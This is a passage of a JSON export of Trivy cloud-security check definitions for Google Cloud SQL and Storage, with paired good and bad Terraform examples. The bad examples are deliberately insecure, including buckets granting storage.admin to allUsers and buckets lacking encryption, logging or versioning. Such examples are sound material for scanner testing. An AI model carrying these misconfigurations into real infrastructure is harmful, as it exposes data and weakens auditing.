        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/sql/pg_no_min_statement_logging.yaml",
        "local_path": "google/sql/pg_no_min_statement_logging.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance"
            ],
            "good": [
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"POSTGRES_12\"\n  region           = \"us-central1\"\n  settings {\n    database_flags {\n      name  = \"log_min_duration_statement\"\n      value = \"-1\"\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"POSTGRES_12\"\n  region           = \"us-central1\"\n  settings {\n    database_flags {\n      name  = \"log_min_duration_statement\"\n      value = \"99\"\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-STORAGE-BUCKET_ENCRYPTION_CUSTOMER_KEY",
        "title": "Bucket Encryption Customer Key",
        "provider": "google",
        "service": "storage",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/storage_bucket#encryption\n  good:\n    - |-\n      resource \"google_storage_bucket\" \"default\" {\n        name                        = \"my-default-bucket\"\n        location                    = \"EU\"\n        force_destroy               = true\n        uniform_bucket_level_access = true\n\n        encryption {\n          default_kms_key_name = \"projects/my-pet-project/locations/us-east1/keyRings/my-key-ring/cryptoKeys/my-key\"\n        }\n      }\n  bad:\n    - |-\n      resource \"google_storage_bucket\" \"default\" {\n        name                        = \"my-default-bucket\"\n        location                    = \"EU\"\n        force_destroy               = true\n        uniform_bucket_level_access = true\n      }\n",
        "file_name": "bucket_encryption_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/storage/bucket_encryption_customer_key.yaml",
        "local_path": "google/storage/bucket_encryption_customer_key.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/storage_bucket#encryption"
            ],
            "good": [
              "resource \"google_storage_bucket\" \"default\" {\n  name                        = \"my-default-bucket\"\n  location                    = \"EU\"\n  force_destroy               = true\n  uniform_bucket_level_access = true\n\n  encryption {\n    default_kms_key_name = \"projects/my-pet-project/locations/us-east1/keyRings/my-key-ring/cryptoKeys/my-key\"\n  }\n}"
            ],
            "bad": [
              "resource \"google_storage_bucket\" \"default\" {\n  name                        = \"my-default-bucket\"\n  location                    = \"EU\"\n  force_destroy               = true\n  uniform_bucket_level_access = true\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-STORAGE-ENABLE_BUCKET_LOGGING",
        "title": "Enable Bucket Logging",
        "provider": "google",
        "service": "storage",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/storage_bucket#logging\n  good:\n    - |-\n      # Bucket with logging configured\n      resource \"google_storage_bucket\" \"default\" {\n        name                        = \"my-default-bucket\"\n        location                    = \"EU\"\n        force_destroy               = true\n        uniform_bucket_level_access = true\n\n        logging {\n          log_bucket = \"my-log-bucket\"\n        }\n      }\n    - |-\n      # Multiple buckets where log bucket doesn't need its own logging\n      resource \"google_storage_bucket\" \"application_bucket\" {\n        name                        = \"my-app-bucket\"\n        location                    = \"EU\"\n        force_destroy               = true\n        uniform_bucket_level_access = true\n\n        logging {\n          log_bucket = \"my-log-bucket\"\n        }\n      }\n\n      resource \"google_storage_bucket\" \"log_bucket\" {\n        name                        = \"my-log-bucket\"\n        location                    = \"EU\"\n        force_destroy               = true\n        uniform_bucket_level_access = true\n        # No logging required since this bucket is used as a log bucket\n      }\n  bad:\n    - |-\n      # Bucket without logging and not used as a log bucket\n      resource \"google_storage_bucket\" \"default\" {\n        name                        = \"my-default-bucket\"\n        location                    = \"EU\"\n        force_destroy               = true\n        uniform_bucket_level_access = true\n      }\n",
        "file_name": "enable_bucket_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/storage/enable_bucket_logging.yaml",
        "local_path": "google/storage/enable_bucket_logging.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/storage_bucket#logging"
            ],
            "good": [
              "# Bucket with logging configured\nresource \"google_storage_bucket\" \"default\" {\n  name                        = \"my-default-bucket\"\n  location                    = \"EU\"\n  force_destroy               = true\n  uniform_bucket_level_access = true\n\n  logging {\n    log_bucket = \"my-log-bucket\"\n  }\n}",
              "# Multiple buckets where log bucket doesn't need its own logging\nresource \"google_storage_bucket\" \"application_bucket\" {\n  name                        = \"my-app-bucket\"\n  location                    = \"EU\"\n  force_destroy               = true\n  uniform_bucket_level_access = true\n\n  logging {\n    log_bucket = \"my-log-bucket\"\n  }\n}\n\nresource \"google_storage_bucket\" \"log_bucket\" {\n  name                        = \"my-log-bucket\"\n  location                    = \"EU\"\n  force_destroy               = true\n  uniform_bucket_level_access = true\n  # No logging required since this bucket is used as a log bucket\n}"
            ],
            "bad": [
              "# Bucket without logging and not used as a log bucket\nresource \"google_storage_bucket\" \"default\" {\n  name                        = \"my-default-bucket\"\n  location                    = \"EU\"\n  force_destroy               = true\n  uniform_bucket_level_access = true\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-STORAGE-ENABLE_BUCKET_VERSIONING",
        "title": "Enable Bucket Versioning",
        "provider": "google",
        "service": "storage",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/storage_bucket#versioning\n  good:\n    - |-\n      resource \"google_storage_bucket\" \"default\" {\n        name                        = \"my-default-bucket\"\n        location                    = \"EU\"\n        force_destroy               = true\n        uniform_bucket_level_access = true\n\n        versioning {\n          enabled = true\n        }\n      }\n  bad:\n    - |-\n      resource \"google_storage_bucket\" \"default\" {\n        name                        = \"my-default-bucket\"\n        location                    = \"EU\"\n        force_destroy               = true\n        uniform_bucket_level_access = true\n\n        versioning {\n          enabled = false\n        }\n      }\n",
        "file_name": "enable_bucket_versioning.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/storage/enable_bucket_versioning.yaml",
        "local_path": "google/storage/enable_bucket_versioning.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/storage_bucket#versioning"
            ],
            "good": [
              "resource \"google_storage_bucket\" \"default\" {\n  name                        = \"my-default-bucket\"\n  location                    = \"EU\"\n  force_destroy               = true\n  uniform_bucket_level_access = true\n\n  versioning {\n    enabled = true\n  }\n}"
            ],
            "bad": [
              "resource \"google_storage_bucket\" \"default\" {\n  name                        = \"my-default-bucket\"\n  location                    = \"EU\"\n  force_destroy               = true\n  uniform_bucket_level_access = true\n\n  versioning {\n    enabled = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-STORAGE-ENABLE_UBLA",
        "title": "Enable Ubla",
        "provider": "google",
        "service": "storage",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/storage_bucket#uniform_bucket_level_access\n  good:\n    - |-\n      resource \"google_storage_bucket\" \"static-site\" {\n        name          = \"image-store.com\"\n        location      = \"EU\"\n        force_destroy = true\n\n        uniform_bucket_level_access = true\n      }\n  bad:\n    - |-\n      resource \"google_storage_bucket\" \"static-site\" {\n        name          = \"image-store.com\"\n        location      = \"EU\"\n        force_destroy = true\n\n        uniform_bucket_level_access = false\n      }\n",
        "file_name": "enable_ubla.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/storage/enable_ubla.yaml",
        "local_path": "google/storage/enable_ubla.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/storage_bucket#uniform_bucket_level_access"
            ],
            "good": [
              "resource \"google_storage_bucket\" \"static-site\" {\n  name          = \"image-store.com\"\n  location      = \"EU\"\n  force_destroy = true\n\n  uniform_bucket_level_access = true\n}"
            ],
            "bad": [
              "resource \"google_storage_bucket\" \"static-site\" {\n  name          = \"image-store.com\"\n  location      = \"EU\"\n  force_destroy = true\n\n  uniform_bucket_level_access = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-STORAGE-NO_PUBLIC_ACCESS",
        "title": "No Public Access",
        "provider": "google",
        "service": "storage",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/storage_bucket_iam#member/members\n  good:\n    - |-\n      resource \"google_storage_bucket\" \"test\" {\n        name     = \"test\"\n        location = \"US\"\n      }\n\n      resource \"google_storage_bucket_iam_binding\" \"binding\" {\n        bucket = google_storage_bucket.test.name\n        role   = \"roles/storage.admin\"\n        members = [\n          \"user:jane@example.com\",\n        ]\n      }\n  bad:\n    - |-\n      resource \"google_storage_bucket\" \"test\" {\n        name     = \"test\"\n        location = \"US\"\n      }\n\n      resource \"google_storage_bucket_iam_binding\" \"binding\" {\n        bucket = google_storage_bucket.test.name\n        role   = \"roles/storage.admin\"\n        members = [\n          \"allAuthenticatedUsers\",\n        ]\n      }\n    - |-\n      resource \"google_storage_bucket\" \"test\" {\n        name     = \"test\"\n        location = \"US\"\n      }\n\n      resource \"google_storage_bucket_iam_binding\" \"binding\" {\n        bucket = google_storage_bucket.test.name\n        role   = \"roles/storage.admin\"\n        members = [\n          \"allUsers\",\n        ]\n      }\n",
        "file_name": "no_public_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/storage/no_public_access.yaml",
        "local_path": "google/storage/no_public_access.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/storage_bucket_iam#member/members"
            ],
            "good": [
              "resource \"google_storage_bucket\" \"test\" {\n  name     = \"test\"\n  location = \"US\"\n}\n\nresource \"google_storage_bucket_iam_binding\" \"binding\" {\n  bucket = google_storage_bucket.test.name\n  role   = \"roles/storage.admin\"\n  members = [\n    \"user:jane@example.com\",\n  ]\n}"
            ],
            "bad": [
              "resource \"google_storage_bucket\" \"test\" {\n  name     = \"test\"\n  location = \"US\"\n}\n\nresource \"google_storage_bucket_iam_binding\" \"binding\" {\n  bucket = google_storage_bucket.test.name\n  role   = \"roles/storage.admin\"\n  members = [\n    \"allAuthenticatedUsers\",\n  ]\n}",
              "resource \"google_storage_bucket\" \"test\" {\n  name     = \"test\"\n  location = \"US\"\n}\n\nresource \"google_storage_bucket_iam_binding\" \"binding\" {\n  bucket = google_storage_bucket.test.name\n  role   = \"roles/storage.admin\"\n  members = [\n    \"allUsers\",\n  ]\n}"
            ]
          }
        }
      }
    ]
  }
}